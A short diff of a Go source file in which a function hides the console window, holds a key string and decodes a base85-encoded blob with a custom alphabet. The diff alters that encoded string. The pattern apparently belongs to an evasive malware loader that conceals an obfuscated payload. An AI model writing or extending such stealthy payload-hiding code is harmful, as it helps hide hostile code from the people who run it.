@@ -13,7 +13,7 @@ import (
 func a() {
 	win.ShowWindow(win.GetConsoleWindow(), win.SW_HIDE)
 	b := []byte("demaxiya")
-	c := "1m>R;_Qw{V84zc{WEXR4yS3kn5EqAKYynp}XQ}"
+	c := "1m>R;_Qw{V84zc{WEXR4yS3kn5EqAKYynp}XQ111}"
 
 	base85, _ := basex.NewEncoding("0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz!#$%&()*+-;<=>?@^_`{|}~")
 	d, _ := base85.Decode(c)
